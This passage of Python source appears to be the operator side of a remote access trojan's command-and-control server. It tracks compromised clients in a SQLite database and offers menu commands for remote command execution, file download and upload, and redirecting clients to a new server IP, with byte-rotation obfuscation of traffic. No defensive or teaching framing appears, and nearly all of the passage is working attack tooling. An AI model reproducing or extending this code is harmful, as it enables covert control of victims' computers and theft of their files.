        Fore.LIGHTWHITE_EX + "|  " + Style.BRIGHT + Fore.LIGHTGREEN_EX + "cmdexec           :" + Style.RESET_ALL + Fore.YELLOW + " Open command exec on selected client       " + Fore.LIGHTWHITE_EX + "  |")
    print(
        Fore.LIGHTWHITE_EX + "|  " + Style.BRIGHT + Fore.LIGHTGREEN_EX + "download          :" + Style.RESET_ALL + Fore.YELLOW + " Download file from selected client         " + Fore.LIGHTWHITE_EX + "  |")
    print(
        Fore.LIGHTWHITE_EX + "|  " + Style.BRIGHT + Fore.LIGHTGREEN_EX + "upload            :" + Style.RESET_ALL + Fore.YELLOW + " upload file to selected client             " + Fore.LIGHTWHITE_EX + "  |")
    print(
        Fore.LIGHTWHITE_EX + "|  " + Style.BRIGHT + Fore.LIGHTGREEN_EX + "Change_IP_server  :" + Style.RESET_ALL + Fore.RED + " change ip server for selected client       " + Fore.LIGHTWHITE_EX + "  |")
    print(
        Fore.LIGHTWHITE_EX + "|  " + Style.BRIGHT + Fore.LIGHTGREEN_EX + "reset <id>        :" + Style.RESET_ALL + Fore.YELLOW + " If can't connect to client, reset and retry" + Fore.LIGHTWHITE_EX + "  |")
    print(
        Fore.LIGHTWHITE_EX + "|  " + Style.BRIGHT + Fore.LIGHTGREEN_EX + "remove <id>       :" + Style.RESET_ALL + Fore.YELLOW + " remove client from DataBase.               " + Fore.LIGHTWHITE_EX + "  |")
    print(
        Fore.LIGHTWHITE_EX + "|  " + Style.BRIGHT + Fore.LIGHTGREEN_EX + "hint              :" + Style.RESET_ALL + Fore.YELLOW + " Show this help menu                        " + Fore.LIGHTWHITE_EX + "  |")
    print(
        Fore.LIGHTWHITE_EX + "|  " + Style.BRIGHT + Fore.LIGHTGREEN_EX + "exit              :" + Style.RESET_ALL + Fore.YELLOW + " Exit the server                            " + Fore.LIGHTWHITE_EX + "  |")
    print(Fore.LIGHTWHITE_EX + "+" + "-" * 67 + "+")

def is_valid_ip(ip_str):
    try:
        ipaddress.ip_address(ip_str)
        return True
    except ValueError:
        return False

def is_recent(client_id, threshold_seconds=10):

    now = datetime.now()
    try:
        with sqlite3.connect(DB_FILE) as conn:
            c = conn.cursor()
            c.execute('SELECT last_seen FROM clients WHERE id = ?', (client_id,))
            row = c.fetchone()
            if not row:
                return False

            last_seen_str = row[0]
            try:
                last_seen = datetime.strptime(last_seen_str, "%Y-%m-%d %H:%M:%S")
            except ValueError:
                return False

            return (now - last_seen).total_seconds() < threshold_seconds
    except sqlite3.Error:
        return False


def rotate_right_6(byte):
    return ((byte >> 6) | ((byte << 2) & 0xFF)) & 0xFF

def decrypt_bytes(encrypted_bytes: bytes) -> bytes:
    return bytes(rotate_right_6(b) for b in encrypted_bytes)

def rotate_left_6(byte):
    return ((byte << 6) | (byte >> 2)) & 0xFF

def encrypt_bytes(decrypted_bytes: bytes) -> bytes:
    return bytes(rotate_left_6(b) for b in decrypted_bytes)

def main():
    global selected_client_addr
    global selected_client_id
    global selected_client_port
    init_db()
    sock = create_socket()

    threading.Thread(target=input_thread, daemon=True).start()
    global stop_flag

    print(Fore.LIGHTCYAN_EX + "[*] Listening on port "+Fore.LIGHTMAGENTA_EX +f"{COMMON_PORT}"+Fore.LIGHTCYAN_EX + "...")
    sock.settimeout(2)

    hintprint()
    try:
        while True:

            if not command_queue.empty():
                cmd = command_queue.get()
                if cmd == "exit":
                    stop_flag.set()
                    print(Fore.RED +"[*] Exiting...")
                    break
                if cmd == "hint":
                    hintprint()

                if cmd == "list":
                    check_clients_online(sock)




                elif cmd.startswith("remove"):
                    parts = cmd.split(maxsplit=1)
                    if len(parts) != 2:
                        print(Fore.YELLOW + "[!] Usage: remove <client_id1,client_id2,...>")
                        continue
                    ids = [x.strip() for x in parts[1].split(",") if x.strip()]
                    if not ids:
                        print(Fore.YELLOW + "[!] No valid IDs provided.")
                        continue
                    for id_str in ids:
                        if not id_str.isdigit():
                            print(Fore.RED + f"[-] Invalid ID: {id_str}")
                            continue
                        remove_id = int(id_str)
                        if delete_client_by_id(remove_id):
                            print(Fore.LIGHTYELLOW_EX + f"[+] Client {remove_id} removed from DB.")
                        else:
                            print(Fore.RED + f"[-] Client {remove_id} not found in DB.")
                    check_clients_online(sock)



                elif cmd.startswith("select"):
                    global selected_client_addr
                    global selected_client_id
                    global selected_client_port
                    parts = cmd.split()
                    if len(parts) != 2 or not parts[1].isdigit():
                        print(Fore.YELLOW + "[!] Usage: select <client_id>")
                        continue

                    selected_id = int(parts[1])
                    conn = sqlite3.connect(DB_FILE)
                    c = conn.cursor()
                    c.execute("SELECT ip, port FROM clients WHERE id = ?", (selected_id,))
                    row = c.fetchone()
                    conn.close()
                    if not row:
                        print(Fore.RED +"[!] Client ID not found.")
                        continue
                    client_ip = row[0]
                    client_port = row[1]


                    found = False
                    if is_recent(selected_id, 10):
                        print(Fore.LIGHTGREEN_EX + f"[+] Client {selected_id} selected and is ONLINE.")
                        selected_client_addr = (client_ip, client_port)
                        selected_client_id = selected_id
                    else:
                        print(Fore.YELLOW + "[!] Client is not online.")
                        selected_client_addr = None
                        selected_client_id = None


                elif cmd == "cmd":
                    if not selected_client_id:
                        print(Fore.YELLOW +"[!] No client selected. Use 'select <id>' first.")
                        continue
                    for i in range(5):
                        try:
                            data, addr = sock.recvfrom(BUFFER_SIZE)
                            pkt_type, client_id, pkt_id, length, payload = parse_packet(data)
                            if addr == selected_client_addr:
                                operation = update_client_last_seen_and_endpoint(client_id, addr[0], addr[1])
                                break
                        except socket.timeout:
                            continue




                    ack = struct.pack('<B I I H', TYPE_CMD, selected_client_id, 0, 0)
                    for i in range(5):
                        sock.sendto(ack, selected_client_addr)
                        print(Fore.LIGHTBLUE_EX +f"[+] Try connect to {selected_client_id} in CMD")
                        sock.settimeout(2)
                        try:
                            data, addr = sock.recvfrom(BUFFER_SIZE)
                            if data and addr == selected_client_addr:
                                pkt_type, cli_id, _, _, _ = parse_packet(data)
                                if pkt_type == TYPE_ACK and cli_id == selected_client_id:
                                    print(Fore.LIGHTGREEN_EX +f"[>] Now ready to send CMDs to client ID {selected_client_id}.")
                                    cmd_run(sock)
                                    hintprint()
                                    break
                                if pkt_type == TYPE_RESET:
                                    ping_packet = struct.pack('<B I I H', TYPE_RESET, selected_client_id, 0, 0)
                                    sock.sendto(ping_packet, selected_client_addr)
                                    break
                        except socket.timeout:
                            continue
                


                elif cmd == "cmdexec":
                    if not selected_client_id:
                        print(Fore.YELLOW +"[!] No client selected. Use 'select <id>' first.")
                        continue
                    for i in range(5):
                        try:
                            data, addr = sock.recvfrom(BUFFER_SIZE)
                            pkt_type, client_id, pkt_id, length, payload = parse_packet(data)
                            if addr == selected_client_addr:
                                operation = update_client_last_seen_and_endpoint(client_id, addr[0], addr[1])
                                break
                        except socket.timeout:
                            continue




                    ack = struct.pack('<B I I H', TYPE_CMD_EXEC, selected_client_id, 0, 0)
                    for i in range(5):
                        sock.sendto(ack, selected_client_addr)
                        print(Fore.LIGHTBLUE_EX +f"[+] Try connect to {selected_client_id} in CMD")
                        sock.settimeout(2)
                        try:
                            data, addr = sock.recvfrom(BUFFER_SIZE)
                            if data and addr == selected_client_addr:
                                pkt_type, cli_id, _, _, _ = parse_packet(data)
                                if pkt_type == TYPE_ACK and cli_id == selected_client_id:
                                    print(Fore.LIGHTGREEN_EX +f"[>] Now ready to send CMDs to client ID {selected_client_id}.")
                                    cmd_run(sock)
                                    hintprint()
                                    break
                                if pkt_type == TYPE_RESET:
                                    ping_packet = struct.pack('<B I I H', TYPE_RESET, selected_client_id, 0, 0)
                                    sock.sendto(ping_packet, selected_client_addr)
                                    break
                        except socket.timeout:
                            continue

                elif cmd == "download":
                    if not selected_client_id:
                        print(Fore.YELLOW +"[!] No client selected. Use 'select <id>' first.")
                        continue



                    for i in range(5):
                        try:
                            data, addr = sock.recvfrom(BUFFER_SIZE)
                            pkt_type, client_id, pkt_id, length, payload = parse_packet(data)
                            if addr == selected_client_addr:
                                operation = update_client_last_seen_and_endpoint(client_id, addr[0], addr[1])
                                break
                        except socket.timeout:
                            continue





                    ack = struct.pack('<B I I H', TYPE_DOWN, selected_client_id, 0, 0)
                    for i in range(5):
                        sock.sendto(ack, selected_client_addr)
                        print(Fore.LIGHTBLUE_EX +f"[+] Try connect to {selected_client_id} for Download")
                        sock.settimeout(2)
                        try:
                            data, addr = sock.recvfrom(BUFFER_SIZE)
                            if data and addr == selected_client_addr:
                                pkt_type, cli_id, _, _, _ = parse_packet(data)
                                if pkt_type == TYPE_ACK and cli_id == selected_client_id:
                                    print(Fore.LIGHTGREEN_EX +f"[+] Download file from selected client {selected_client_id} .... ")
                                    download_run(sock)
                                    hintprint()
                                    break
                                if pkt_type == TYPE_RESET:
                                    ping_packet = struct.pack('<B I I H', TYPE_RESET, selected_client_id, 0, 0)
                                    sock.sendto(ping_packet, selected_client_addr)
                                    break
                        except socket.timeout:
                            continue


                elif cmd == "upload":
                    if not selected_client_id:
                        print(Fore.YELLOW +"[!] No client selected. Use 'select <id>' first.")
                        continue


                    for i in range(5):
                        try:
                            data, addr = sock.recvfrom(BUFFER_SIZE)
                            pkt_type, client_id, pkt_id, length, payload = parse_packet(data)
                            if addr == selected_client_addr:
                                operation = update_client_last_seen_and_endpoint(client_id, addr[0], addr[1])
                                break
                        except socket.timeout:
                            continue







                    ack = struct.pack('<B I I H', TYPE_UPLO, selected_client_id,0, 0)
                    for i in range(5):
                        sock.sendto(ack, selected_client_addr)
                        print(Fore.LIGHTBLUE_EX +f"[+] Try connect to {selected_client_id} for Upload")
                        sock.settimeout(2)
                        try:
                            data, addr = sock.recvfrom(BUFFER_SIZE)
                            if data and addr == selected_client_addr:
                                pkt_type, cli_id, _, _, _ = parse_packet(data)
                                if pkt_type == TYPE_ACK and cli_id == selected_client_id:


                                    print(Fore.LIGHTGREEN_EX +f"[+] Uploading file to selected client {selected_client_id} .... ")
                                    upload_run(sock)
                                    hintprint()
                                    break
                                if pkt_type == TYPE_RESET:
                                    ping_packet = struct.pack('<B I I H', TYPE_RESET, selected_client_id, 0, 0)
                                    sock.sendto(ping_packet, selected_client_addr)
                                    break
                        except socket.timeout:
                            continue

                elif cmd.startswith("reset"):
                    parts = cmd.split()
                    if len(parts) != 2 or not parts[1].isdigit():
                        print(Fore.YELLOW +"[!] Usage: reset <client_id>")
                        continue

                    id_reset = int(parts[1])

                    ack = struct.pack('<B I I H', TYPE_RESET, id_reset, 0, 0)

                    conn = sqlite3.connect(DB_FILE)
                    c = conn.cursor()
                    c.execute("SELECT ip, port FROM clients WHERE id = ?", (id_reset,))
                    row = c.fetchone()
                    conn.close()
                    for i in range(5):
                        sock.sendto(ack, row)
                        sleep(0.2)


                elif cmd == "exit":
                    break

                elif cmd == "Change_IP_server":
                    if not selected_client_id:
                        print(Fore.YELLOW +"[!] No client selected. Use 'select <id>' first.")
                        continue
                    print("send New IP for change IP server:")
                    new_ip = None
                    while True:
                        if not command_queue.empty():
                            new_ip = command_queue.get()
                            break
                    if is_valid_ip(new_ip):
                        print(Fore.LIGHTGREEN_EX +f"[+] New IP {new_ip} is valid.")
                        print(Fore.YELLOW +f"are you sure you want to change it to {new_ip}?(Y/n)")
                        while True:
                            try:
                                if not command_queue.empty():
                                    anwser = command_queue.get()
                                    break
                            except KeyboardInterrupt:
                                continue
                        if anwser == "Y":
                            new_ip_str = str(new_ip).encode()
                            print(new_ip_str)
                            for i in range(5):
                                new_ip_str = encrypt_bytes(new_ip_str)
                                ack = struct.pack('<B I I H', TYPE_IP_CHANGE, selected_client_id, 0, len(new_ip_str)) + new_ip_str
                                sock.sendto(ack, selected_client_addr)
                                print(Fore.LIGHTBLUE_EX + f"[+] Try connect to {selected_client_id} for Change IP Server")
                                sock.settimeout(2)
                                try:
                                    data, addr = sock.recvfrom(BUFFER_SIZE)
                                    if data and addr == selected_client_addr:
                                        pkt_type, cli_id, _, _, _ = parse_packet(data)
                                        if pkt_type == TYPE_ACK and cli_id == selected_client_id:
                                            print(
                                                Fore.LIGHTGREEN_EX + f"change ip to {selected_client_id} Successful.")
                                            break
                                        if pkt_type == TYPE_RESET:
                                            ping_packet = struct.pack('<B I I H', TYPE_RESET, selected_client_id, 0, 0)
                                            sock.sendto(ping_packet, selected_client_addr)
                                            continue
                                except socket.timeout:
                                    continue
                        else :
                            print(Fore.LIGHTBLUE_EX + "[!] continue...")
                    else:
                        print(Fore.YELLOW +f"[!] New IP {new_ip} is invalid.")
                    hintprint()


            try:
                data, addr = sock.recvfrom(BUFFER_SIZE)
                if not data or len(data) < 6:
                    continue
                pkt_type, client_id, pkt_id, length, payload = parse_packet(data)
                if pkt_type == TYPE_FIRST:
                    payload = decrypt_bytes(payload)
                    info_dict = parse_client_info(payload)
                    client_id = insert_client(addr[0], addr[1], info_dict)
                    send_ack_with_id(sock, addr, client_id)
                if pkt_type == TYPE_ACK:
                    operation = update_client_last_seen_and_endpoint(client_id, addr[0], addr[1])
                    ping_packet = struct.pack('<B I I H', TYPE_PING, client_id, 0, 0)
                    sock.sendto(ping_packet, addr)
                elif pkt_type == TYPE_FUNC_TIME_OUT:
                    ping_packet = struct.pack('<B I I H', TYPE_FUNC_TIME_OUT, 0, 0, 0)
                    sock.sendto(ping_packet, addr)
            except socket.timeout:
                continue
    except KeyboardInterrupt:
        print(Fore.RED +"\nClosed SOCKET ...\n")
        stop_flag.set()
        sock.close()
        return



if __name__ == "__main__":
    main()
